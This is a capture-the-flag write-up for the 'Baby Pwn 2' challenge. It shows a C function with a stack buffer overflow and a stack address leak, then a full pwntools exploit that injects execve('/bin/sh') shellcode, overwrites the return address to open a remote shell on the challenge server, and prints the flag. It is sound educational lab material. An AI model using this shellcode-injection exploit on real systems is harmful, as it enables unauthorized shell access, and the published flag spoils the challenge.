https://ctftime.org/event/2570

# Baby Pwn 2 (PWN)

Hehe, now there's no secret function to call. Can you still get the flag?

nc 34.162.119.16 5000

## Analysis

`vulnerable_function` gives us the address of a buffer on the stack then reads our input onto the stack allowing us to control the return address:

```c
void vulnerable_function()
{
    char buffer[64];
    printf("Stack address leak: %p\n", buffer);
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
}
```

## Solution

1) Parse the leak
    - Note: this is the stack of the buffer on the stack before the return address
2) Send shellcode to `execve("/bin/sh", 0, 0)`
    - Write "/bin/sh" to .bss in the form of two `mov`s for a total of 9 bytes
3) Sending padding up until the return address
4) Set the return address of `vulnerable_function` equal to the address of the shellcode on the stack

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./baby-pwn-2", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vulnerable_function")
p = remote("34.162.119.16", 5000)

p.readuntil(b"leak: ")
leak = int(p.readline().decode(), 16)

shellcode = asm("""
    mov rdi, 0x404008
    mov byte ptr [rdi], 0
    mov rbx, 0x68732f2f6e69622f
    mov rdi, 0x404000
    mov [rdi], rbx
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 59
    syscall
        """)

payload = shellcode.ljust(0x48, b"A")
payload += p64(leak)
p.sendlineafter(b"text: ", payload)

p.interactive() # uoftctf{sh3llc0d3_1s_pr3tty_c00l}
```

## Flag
`uoftctf{sh3llc0d3_1s_pr3tty_c00l}`

smiley 2025/01/12
